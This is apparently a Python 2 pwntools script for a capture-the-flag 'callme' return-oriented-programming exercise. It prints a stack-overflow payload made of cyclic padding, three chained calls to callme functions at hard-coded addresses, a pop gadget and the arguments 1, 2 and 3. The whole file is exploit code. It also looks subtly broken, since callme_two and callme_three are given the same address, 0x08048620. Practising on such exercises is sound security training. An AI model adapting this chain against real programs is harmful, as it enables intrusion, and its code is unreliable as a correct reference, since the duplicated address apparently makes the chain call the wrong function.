import pwn

junk = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0A"

callme_one = pwn.p32(0x080485c0)
callme_two = pwn.p32(0x08048620)
callme_three = pwn.p32(0x08048620)
ret = pwn.p32(0x08048562)
popus = pwn.p32(0x080488a9)

one = pwn.p32(0x1)
two = pwn.p32(0x2)
three = pwn.p32(0x3)


print junk +  callme_one + popus + one + two + three + callme_two  + popus + one + two + three + callme_three + popus + one + two + three   
